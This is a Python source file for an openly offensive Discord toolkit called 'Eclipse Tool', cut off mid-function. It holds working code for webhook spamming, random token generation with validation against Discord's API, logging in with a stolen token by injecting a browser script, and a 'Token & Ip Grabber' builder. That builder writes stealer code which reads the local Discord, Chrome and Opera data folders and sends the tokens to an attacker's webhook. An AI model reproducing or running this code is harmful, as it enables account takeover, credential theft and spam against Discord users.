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"

          ids = []
          token = []

          print("Succefully Created 10 Webhooks!")
          for x in range(1):

              r = requests.post(url,headers=header,json={'name':'Nuked By Eclipse'})
              try:
                  ids.append(r.json()['id'])
                  token.append(r.json()['token'])
              except Exception as e:
                  print('')

              length = len(ids)
              for i in range(length):
                  header2 = {
                      "authority": "discord.com",
                      "method": "POST",
                      "path": f"/api/v9/webhooks/{ids[i]}",
                      "scheme": "https",
                      "accept": "*/*",
                      "accept-encoding": "gzip, deflate, br",
                      "accept-language": "en-US",
                      "Authorization": f'{tukan3}',
                      "content-length": "0",
                      "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                      "origin": "https://discord.com",
                      'referer': 'https://discord.com/channels/@me',
                      "sec-fetch-dest": "empty",
                      "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "user-agent": useragent(),
                      "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                      "x-debug-options": "bugReporterEnabled",
                      "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                  }
                  url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                  t = requests.patch(url1,headers=header2,json={'avatar':url2})
                  print("Succefully changed the avatar to a *Eclipse* for the Webhooks!")

                  link = []

                  for t in range(length):
                      url3 = f'https://discord.com/api/webhooks/{ids[t]}/{token[t]}'
                      link.append(url3)

                  for x in range(5):
                      r = requests.post(url3, headers=header, json={'content':msg})
                      if r.status_code == 200 or 204:
                          print(f'Successfully sent {msg} to the chat')

      threads = []
      for x in range(10):
          t = threading.Thread(target=spammer)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

    elif options2 in ['0','00']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options2 not in ['0','00']:
      print(Fore.YELLOW)
      os.system('pause')
      webhooks()

  def nitro():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Nitro Generator")
    colorama.init()

    print(f'''
{Fore.RED}
 ███▄    █   ██▄▄▄█████▓ ██▀███   ▒█████     ▄████ ▓█████ ███▄    █ 
 ██ ▀█   █ ▒▓██▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▓██  ▀█ ██▒░▒██▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
▓██▒  ▐▌██▒ ░██░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
▒██░   ▓██░ ░██  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░░▒████▒██░   ▓██░
░ ▒░   ▒ ▒  ░▓   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░  ▒     ░      ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░   ░ ░  ░ ░░   ░ ▒░
   ░   ░ ░   ▒   ░ ░       ░   ░ ░ ░ ░ ▒  ░ ░   ░ ░   ░     ░   ░ ░ 
         ░   ░             ░         ░ ░        ░     ░           ░ 

      ''')



    webhooklink = str(input(f"""{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Webhook URL: """))
    
    count = 0

    webhook = "~~WEBHOOK_URL~~""".replace("~~WEBHOOK_URL~~", webhooklink)

    while True:
        try:
            code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
            post = {"content":"https://discord.com/billing/promotions/"+code}
            head = {

                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                    'content-type' : 'application/json'
                }
            count += 1
            print(f'{Fore.RED}[{g}{Fore.YELLOW}>{Fore.RESET}{Fore.RED}] {Fore.YELLOW}Generated Nitro | [{count}]')
            s = requests.post(webhook, json=post, headers=head)
        except:
            print(f"[{r}!{Fore.RESET}] ERROR!")
            break

  global proxyscrape
  def proxyscrape():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Proxy Scraper")
    print(Fore.RED + '''

 ██▓███   ██▀███   ▒█████  ▒██   ██▒▓██   ██▓      ██████   ▄████▄  ██▀███   ▄▄▄      ██▓███   ▓█████ ██▀███  
▓██░  ██ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░ ▒██  ██▒    ▒██    ▒  ▒██▀ ▀█ ▓██ ▒ ██▒▒████▄   ▓██░  ██  ▓█   ▀▓██ ▒ ██▒
▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░  ▒██ ██░    ░ ▓██▄    ▒▓█    ▄▓██ ░▄█ ▒▒██  ▀█▄ ▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ░ ▐██▓░      ▒   ██▒▒▒▓▓▄ ▄██▒██▀▀█▄  ░██▄▄▄▄██▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄  
▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒  ░ ██▒▓░    ▒██████▒▒░▒ ▓███▀ ░██▓ ▒██▒▒▓█   ▓██▒██▒ ░  ░▒░▒████░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ██▒▒▒     ▒ ▒▓▒ ▒ ░░░ ░▒ ▒  ░ ▒▓ ░▒▓░░▒▒   ▓▒█▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░▒ ░ ▒   ░ ▒ ▒░ ░░   ░▒ ░ ▓██ ░▒░     ░ ░▒  ░     ░  ▒    ░▒ ░ ▒ ░ ░   ▒▒ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ 
░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ▒ ░░      ░  ░  ░   ░         ░░   ░   ░   ▒  ░░           ░    ░░   ░ 
            ░         ░ ░   ░    ░   ░ ░               ░   ░ ░        ░           ░           ░   ░     ░     


    ''')
    typeproxy = int(input(f"""
{Fore.RED}[{Fore.YELLOW}1{Fore.RED}] {Fore.YELLOW}Http/Https
{Fore.RED}[{Fore.YELLOW}2{Fore.RED}] {Fore.YELLOW}Socks4
{Fore.RED}[{Fore.YELLOW}3{Fore.RED}] {Fore.YELLOW}Socks5

   {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}"""))
    if typeproxy == 1:
      out_file = "Https Proxies.txt"
      proxies = open(out_file,'ab')
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/http.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.YELLOW + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()

    elif typeproxy == 2:
      out_file = "Socks4 Proxies.txt"
      proxies = open(out_file,'wb')
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks4.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.YELLOW + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()

    elif typeproxy == 3:
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks5.txt')
      out_file = "Socks5 Proxies.txt"
      proxies = open(out_file,'wb')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.YELLOW + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()
    else:
      print("Invalid Option")

  global tokengen
  def tokengen():

    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Generator")
    print(f"""
{Fore.RED}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █        ▄████ ▓█████ ███▄    █ 
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █     ▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ░▒▓███▀▒░░▒████▒██░   ▓██░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒      ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░      ░   ░   ░ ░  ░ ░░   ░ ▒░
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░     ░ ░   ░ ░   ░     ░   ░ ░ 
             ░ ░  ░  ░   ░   ░           ░           ░     ░           ░ 


    """)

    howmany111 = int(input(f"""{Fore.RED}[{Fore.YELLOW}>{Fore.RED}] {Fore.YELLOW}How many tokens to generate: """))

    fileask = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Do you want to output to a text file?: ''').lower()


    chars = string.ascii_letters + string.digits

    if fileask in yeslist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))

        result = "OTIw" + a + '.' + b + '.' + c
        file = open("gennedTokens.txt", 'a')
        file.write(result + '\n')
        token.append(result)
      print(Fore.YELLOW + "All tokens are random characters.")

      checktoken = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Do you want to check the tokens?: ''')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.RED}[+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m[-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.YELLOW}There are {valid} valid tokens and {invalid} invalid tokens')
      print(Fore.RED + "Finished! Check where the file is located.")
      file.close() 

    elif fileask in nolist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))


        tokens = "OTIw" + a + "." + b + "." + c
        token.append(tokens)
        print(Fore.YELLOW + tokens)
      print(Fore.YELLOW + "All tokens are random characters.")
      checktoken = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}Do you want to check the tokens?: ''')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.YELLOW} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.YELLOW} There are {valid} valid tokens and {invalid} invalid tokens')

    else:
      print("Invalid Option")

  def login():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Login") 
    print(f'''
{Fore.RED}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █       ██▓    ▒█████   ▄████   ██▓ ███▄    █     
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ▓██▒   ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █     
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒     ▒██░   ▒██░  ██▒▒██░▄▄▄▒▒██▒▓██  ▀█ ██▒    
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒     ▒██░   ▒██   ██░░▓█  ██░░██░▓██▒  ▐▌██▒    
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒░██████░ ████▓▒░▒▓███▀▒░░██░▒██░   ▓██░    
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░░ ▒░▓  ░ ▒░▒░▒░ ░▒   ▒  ░▓  ░ ▒░   ▒ ▒     
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░░ ░ ▒    ░ ▒ ▒░  ░   ░ ░ ▒ ░░ ░░   ░ ▒░    
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░ ░  ░ ░ ░ ▒   ░   ░ ░ ▒ ░   ░   ░ ░     
             ░ ░  ░  ░   ░   ░           ░     ░    ░      ░ ░       ░   ░           ░     


  {Fore.YELLOW}                 
    ''')

    token = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the token you want to log in with?: ''')
    directory = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the directory with your chrome driver (Check inside of this folder): ''')

    chromedriver = f'{directory}/chromedriver.exe'

    driver = webdriver.Chrome(chromedriver)

    driver.set_window_size(1800,1800)

    URL = 'https://discord.com/login/'
    driver.get(URL)


    message = '''
    function login(token) {
    setInterval(() => {
    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
    location.reload();
    }, 2500);
    }

    login("''' + token + '''")
    '''
    driver.execute_script(message)

    time.sleep(10)
    cls()
    print('To close the browser')
    os.system('pause')

  def discordserver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Eclipse Support")
    print(f'''
{Fore.RED}
  ██████ ██░ ██ ██▀███ ▓█████▓█████▄  ▄████ ███▄ ▄███▓▄▄▄      ███▄    █ 
▒██    ▒▓██░ ██▓██ ▒ ██▓█   ▀▒██▀ ██▌██▒ ▀█▓██▒▀█▀ ██▒████▄    ██ ▀█   █ 
░ ▓██▄  ▒██▀▀██▓██ ░▄█ ▒███  ░██   █▒██░▄▄▄▓██    ▓██▒██  ▀█▄ ▓██  ▀█ ██▒
  ▒   ██░▓█ ░██▒██▀▀█▄ ▒▓█  ▄░▓█▄   ░▓█  ██▒██    ▒██░██▄▄▄▄██▓██▒  ▐▌██▒
▒██████▒░▓█▒░██░██▓ ▒██░▒████░▒████▓░▒▓███▀▒██▒   ░██▒▓█   ▓██▒██░   ▓██░
▒ ▒▓▒ ▒ ░▒ ░░▒░░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒ ░▒   ▒░ ▒░   ░  ░▒▒   ▓▒█░ ▒░   ▒ ▒ 
░ ░▒  ░ ░▒ ░▒░ ░ ░▒ ░ ▒░░ ░  ░░ ▒  ▒  ░   ░░  ░      ░ ▒   ▒▒ ░ ░░   ░ ▒░
░  ░  ░  ░  ░░ ░ ░░   ░   ░   ░ ░  ░░ ░   ░░      ░    ░   ▒     ░   ░ ░ 
      ░  ░  ░  ░  ░       ░  ░  ░         ░       ░        ░  ░        ░ 
                              ░                                          


    ''')  
    whichserver = int(input(f"""
  {Fore.RED}[{Fore.YELLOW}1{Fore.RED}] {Fore.YELLOW}Rety Design's Discord server
  {Fore.RED}[{Fore.YELLOW}2{Fore.RED}] {Fore.YELLOW}ShredGman Github
  {Fore.RED}[{Fore.YELLOW}0{Fore.RED}] EXIT


  {Fore.RED}[{Fore.YELLOW}>{Fore.RED}]{Fore.YELLOW}"""))


    if whichserver == 1:
      webbrowser.open('https://discord.gg/SZhvDGJDCRy')
    elif whichserver == 2:
      webbrowser.open('https://github.com/ShredGman')
    elif whichserver == 0:
      tool()
      return
    else:
      print("Invalid Option.")

  global grabber
  def grabber():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token & Ip Grabber") 
      print(f'''
{Fore.RED}
 ▄████  ██▀███   ▄▄▄      ▄▄▄▄    ▄▄▄▄    ▓█████ ██▀███  
 ██▒ ▀█▓██ ▒ ██▒▒████▄   ▓█████▄ ▓█████▄  ▓█   ▀▓██ ▒ ██▒
▒██░▄▄▄▓██ ░▄█ ▒▒██  ▀█▄ ▒██▒ ▄██▒██▒ ▄██ ▒███  ▓██ ░▄█ ▒
░▓█  ██▒██▀▀█▄  ░██▄▄▄▄██▒██░█▀  ▒██░█▀   ▒▓█  ▄▒██▀▀█▄  
▒▓███▀▒░██▓ ▒██▒▒▓█   ▓██░▓█  ▀█▓░▓█  ▀█▓▒░▒████░██▓ ▒██▒
░▒   ▒ ░ ▒▓ ░▒▓░░▒▒   ▓▒█░▒▓███▀▒░▒▓███▀▒░░░ ▒░ ░ ▒▓ ░▒▓░
 ░   ░   ░▒ ░ ▒ ░ ░   ▒▒ ▒░▒   ░ ▒░▒   ░ ░ ░ ░    ░▒ ░ ▒ 
 ░   ░   ░░   ░   ░   ▒   ░    ░  ░    ░     ░    ░░   ░ 
     ░    ░           ░   ░       ░      ░   ░     ░     
''')
      filename = filename.replace('.py', '')

      file = open(filename + '.py','w')
      grabbingcode = '''
import os
import requests
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
web1 = '""" + hooklink + """'
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\\\Discord",
    "Discord Canary": rm + "\\\\discordcanary",
    "Discord PTB": rm + "\\\\discordptb",
    "Google Chrome": lc + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera": rm + "\\\\Opera Software\\\\Opera Stable"
}
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def da(token):
    try:
        return loads(
